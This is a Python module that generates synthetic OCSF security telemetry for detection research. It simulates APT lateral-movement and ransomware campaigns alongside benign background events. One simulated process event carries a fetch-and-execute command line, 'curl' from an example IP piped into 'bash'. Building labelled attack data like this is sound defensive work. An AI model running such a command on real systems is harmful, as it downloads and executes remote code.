from __future__ import annotations
"""
AHRAS Module / Digital Twin — Telemetry & Scenario Data Engine (Phase 11)
--------------------------------------------------------------------------
Generates stateful, causally-coherent, multi-modal OCSF security telemetry streams
grounded in the enterprise Security Twin topology:
  - Generates multi-stage cyber campaigns (Recon -> Initial Access -> Execution -> Lateral -> Exfil)
  - Links network flows, process execution lineages (PID/PPID), file modifications, and identity tokens
  - Blends deterministic attack kill-chains with realistic stochastic benign enterprise background traffic
  - Guarantees 100% causal temporal ordering: t_0 < t_1 < ... < t_k with explicit provenance parent IDs
  - Outputs OCSF v1.1 compliant JSON records for leak-free, reproducible experimental benchmarking
"""

import copy
import json
import logging
import math
import os
import time
import uuid
from dataclasses import asdict, dataclass, field
from enum import Enum
from typing import Any, Dict, Generator, List, Optional, Tuple

import numpy as np

from security_twin.models import (
    ActionType,
    AttackScenario,
    AttackStage,
    AttackStep,
    Host,
    Process,
    File,
    Network,
    Identity,
)
from security_twin.state import SecurityTwin

log = logging.getLogger(__name__)


class CampaignType(str, Enum):
    RANSOMWARE_BURST = "RANSOMWARE_BURST"
    APT_LATERAL_MOVEMENT = "APT_LATERAL_MOVEMENT"
    SUPPLY_CHAIN_CLOUD = "SUPPLY_CHAIN_CLOUD"
    BOTNET_BEACON_EXFIL = "BOTNET_BEACON_EXFIL"


@dataclass
class CoherentTelemetryEvent:
    """An OCSF telemetry event grounded in the Security Twin with causal provenance metadata."""
    event_id: str
    trace_id: str
    timestamp: float
    ocsf_class: str                      # "network_activity", "process_activity", "file_activity", "cloud_api"
    entity_key: str
    is_attack: bool
    attack_stage: Optional[str] = None
    technique_id: Optional[str] = None
    technique_name: Optional[str] = None
    parent_event_id: Optional[str] = None
    ocsf_payload: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


class SecurityTwinDataEngine:
    """
    Stateful data generator that simulates multi-stage intrusion campaigns and
    benign background traffic directly atop a SecurityTwin topology.
    """

    def __init__(self, twin: Optional[SecurityTwin] = None, seed: int = 42):
        self.rng = np.random.RandomState(seed)
        self.seed = seed
        self.twin = twin or self._build_default_enterprise_twin()

    def _build_default_enterprise_twin(self) -> SecurityTwin:
        """Constructs a realistic enterprise digital twin topology."""
        twin = SecurityTwin()

        # Domain Controller (Tier-1 Crown Jewel)
        dc = Host(host_id="dc01", hostname="dc01.corp.local", ip_address="10.0.1.5", criticality=0.95)
        twin.add_host(dc)

        # Critical Database Server
        db = Host(host_id="srv-db01", hostname="srv-db01.corp.local", ip_address="10.0.1.10", criticality=0.90)
        twin.add_host(db)

        # Web / Application Gateway
        gw = Host(host_id="gw-web01", hostname="gw-web01.corp.local", ip_address="10.0.2.15", criticality=0.75)
        twin.add_host(gw)

        # Standard Workstations
        for i in range(1, 6):
            ws = Host(host_id=f"ws-{i:02d}", hostname=f"ws-{i:02d}.corp.local", ip_address=f"10.0.3.{20+i}", criticality=0.35)
            twin.add_host(ws)

        return twin

    def generate_campaign_stream(
        self,
        campaign_type: CampaignType = CampaignType.APT_LATERAL_MOVEMENT,
        start_time: float = 1700000000.0,
        n_background_events: int = 100,
    ) -> List[CoherentTelemetryEvent]:
        """
        Generates a chronological sequence of multi-modal OCSF events combining a
        causally-linked attack kill-chain with interleaved benign background events.
        """
        trace_id = f"trace-{uuid.uuid4().hex[:8]}"
        attack_events = self._generate_attack_killchain(campaign_type, trace_id, start_time)
        bg_events = self._generate_background_traffic(trace_id, start_time, n_background_events)

        # Merge and sort chronologically to ensure causal consistency
        all_events = attack_events + bg_events
        all_events.sort(key=lambda e: e.timestamp)
        return all_events

    def _generate_attack_killchain(
        self,
        campaign_type: CampaignType,
        trace_id: str,
        start_time: float,
    ) -> List[CoherentTelemetryEvent]:
        """Generates multi-stage causally-connected attack steps."""
        events: List[CoherentTelemetryEvent] = []
        curr_t = start_time + 10.0

        if campaign_type == CampaignType.APT_LATERAL_MOVEMENT:
            # Step 1: External Port Scan / Recon
            e1_id = f"evt-{uuid.uuid4().hex[:8]}"
            events.append(CoherentTelemetryEvent(
                event_id=e1_id,
                trace_id=trace_id,
                timestamp=curr_t,
                ocsf_class="network_activity",
                entity_key="198.51.100.42",
                is_attack=True,
                attack_stage=AttackStage.RECON.value,
                technique_id="T1046",
                technique_name="Network Service Scanning",
                parent_event_id=None,
                ocsf_payload={
                    "ocsf_class": "network_activity",
                    "src_endpoint": {"ip": "198.51.100.42", "port": 49152},
                    "dst_endpoint": {"ip": "10.0.2.15", "port": 443, "hostname": "gw-web01"},
                    "packet_count": 450,
                    "byte_count": 28800,
                    "duration_sec": 4.5,
                    "protocol": "TCP",
                },
            ))
            curr_t += 5.0

            # Step 2: Exploitation & Reverse Shell Process Spawn
            e2_id = f"evt-{uuid.uuid4().hex[:8]}"
            events.append(CoherentTelemetryEvent(
                event_id=e2_id,
                trace_id=trace_id,
                timestamp=curr_t,
                ocsf_class="process_activity",
                entity_key="gw-web01",
                is_attack=True,
                attack_stage=AttackStage.EXECUTION.value,
                technique_id="T1059",
                technique_name="Command Scripting Interpreter (sh)",
                parent_event_id=e1_id,
                ocsf_payload={
                    "ocsf_class": "process_activity",
                    "device": {"hostname": "gw-web01.corp.local"},
                    "actor": {"process": {"name": "nginx", "pid": 1102}},
                    "process": {"name": "sh", "pid": 4820, "cmdline": "/bin/sh -c 'curl 198.51.100.42/payload.bin | bash'"},
                },
            ))
            curr_t += 8.0

            # Step 3: Lateral Movement SMB Connection to Workstation
            e3_id = f"evt-{uuid.uuid4().hex[:8]}"
            events.append(CoherentTelemetryEvent(
                event_id=e3_id,
                trace_id=trace_id,
                timestamp=curr_t,
                ocsf_class="network_activity",
                entity_key="10.0.2.15",
                is_attack=True,
                attack_stage=AttackStage.LATERAL_MOVEMENT.value,
                technique_id="T1021",
                technique_name="Remote Services: SMB/Windows Admin Shares",
                parent_event_id=e2_id,
                ocsf_payload={
                    "ocsf_class": "network_activity",
                    "src_endpoint": {"ip": "10.0.2.15", "hostname": "gw-web01"},
                    "dst_endpoint": {"ip": "10.0.3.21", "port": 445, "hostname": "ws-01"},
                    "packet_count": 820,
                    "byte_count": 64000,
                    "duration_sec": 2.1,
                    "protocol": "TCP",
                },
            ))
            curr_t += 6.0

            # Step 4: Credential Theft / Kerberoasting on Domain Controller
            e4_id = f"evt-{uuid.uuid4().hex[:8]}"
            events.append(CoherentTelemetryEvent(
                event_id=e4_id,
                trace_id=trace_id,
                timestamp=curr_t,
                ocsf_class="cloud_api",
                entity_key="dc01",
                is_attack=True,
                attack_stage=AttackStage.CREDENTIAL_ACCESS.value,
                technique_id="T1078",
                technique_name="Valid Accounts / Kerberoasting",
                parent_event_id=e3_id,
                ocsf_payload={
                    "ocsf_class": "cloud_api",
                    "actor": {"user": {"name": "krbtgt", "domain": "CORP"}},
                    "device": {"hostname": "dc01.corp.local"},
                    "action": "TGS_REQ_RC4_HMAC",
                    "status": "SUCCESS",
                },
            ))

        elif campaign_type == CampaignType.RANSOMWARE_BURST:
            # Step 1: Network Ingress Drop
            e1_id = f"evt-{uuid.uuid4().hex[:8]}"
            events.append(CoherentTelemetryEvent(
                event_id=e1_id,
                trace_id=trace_id,
                timestamp=curr_t,
                ocsf_class="network_activity",
                entity_key="10.0.3.22",
                is_attack=True,
                attack_stage=AttackStage.INITIAL_ACCESS.value,
                technique_id="T1190",
                technique_name="Exploit / Malicious Download",
                parent_event_id=None,
                ocsf_payload={
                    "ocsf_class": "network_activity",
                    "src_endpoint": {"ip": "203.0.113.88", "port": 80},
                    "dst_endpoint": {"ip": "10.0.3.22", "hostname": "ws-02"},
                    "packet_count": 1200,
                    "byte_count": 1050000,
                    "protocol": "TCP",
                },
            ))
            curr_t += 3.0

            # Step 2: High Entropy File Encryption Burst
            e2_id = f"evt-{uuid.uuid4().hex[:8]}"
            events.append(CoherentTelemetryEvent(
                event_id=e2_id,
                trace_id=trace_id,
                timestamp=curr_t,
                ocsf_class="file_activity",
                entity_key="ws-02",
                is_attack=True,
                attack_stage=AttackStage.EXECUTION.value,
                technique_id="T1486",
                technique_name="Data Encrypted for Impact",
                parent_event_id=e1_id,
                ocsf_payload={
                    "ocsf_class": "file_activity",
                    "device": {"hostname": "ws-02.corp.local"},
                    "file": {"path": "C:\\Users\\Finance\\Q3_Report.xlsx.locked", "entropy": 7.94},
                    "action": "MODIFY",
                },
            ))

        return events

    def _generate_background_traffic(
        self,
        trace_id: str,
        start_time: float,
        n_events: int,
    ) -> List[CoherentTelemetryEvent]:
        """Generates realistic normal enterprise background activity."""
        bg: List[CoherentTelemetryEvent] = []
        host_names = ["gw-web01", "dc01", "srv-db01", "ws-01", "ws-02", "ws-03"]

        for i in range(n_events):
            t = start_time + self.rng.uniform(0.0, 60.0)
            h = self.rng.choice(host_names)
            evt_type = self.rng.choice(["network_activity", "process_activity", "file_activity"])
            e_id = f"bg-{uuid.uuid4().hex[:8]}"

            if evt_type == "network_activity":
                payload = {
                    "ocsf_class": "network_activity",
                    "src_endpoint": {"ip": f"10.0.3.{self.rng.randint(20, 26)}", "hostname": h},
                    "dst_endpoint": {"ip": "10.0.1.5", "port": 53, "hostname": "dc01"},
                    "packet_count": self.rng.randint(2, 20),
                    "byte_count": self.rng.randint(120, 1500),
                    "protocol": "UDP",
                }
            elif evt_type == "process_activity":
                payload = {
                    "ocsf_class": "process_activity",
                    "device": {"hostname": f"{h}.corp.local"},
                    "actor": {"process": {"name": "systemd", "pid": 1}},
                    "process": {"name": "cron", "pid": self.rng.randint(1000, 9000)},
                }
            else:
                payload = {
                    "ocsf_class": "file_activity",
                    "device": {"hostname": f"{h}.corp.local"},
                    "file": {"path": f"/var/log/syslog.{self.rng.randint(1, 5)}", "entropy": self.rng.uniform(3.2, 4.8)},
                    "action": "READ",
                }

            bg.append(CoherentTelemetryEvent(
                event_id=e_id,
                trace_id=trace_id,
                timestamp=round(t, 3),
                ocsf_class=evt_type,
                entity_key=h,
                is_attack=False,
                parent_event_id=None,
                ocsf_payload=payload,
            ))

        return bg


def generate_coherent_training_dataset(
    n_campaigns: int = 20,
    seed: int = 42,
) -> List[CoherentTelemetryEvent]:
    """Helper entry point generating a balanced, coherent multi-stage dataset."""
    engine = SecurityTwinDataEngine(seed=seed)
    all_events: List[CoherentTelemetryEvent] = []
    base_time = 1710000000.0

    campaign_types = list(CampaignType)
    for c_idx in range(n_campaigns):
        ctype = campaign_types[c_idx % len(campaign_types)]
        stream = engine.generate_campaign_stream(
            campaign_type=ctype,
            start_time=base_time + (c_idx * 120.0),
            n_background_events=40,
        )
        all_events.extend(stream)

    all_events.sort(key=lambda e: e.timestamp)
    return all_events
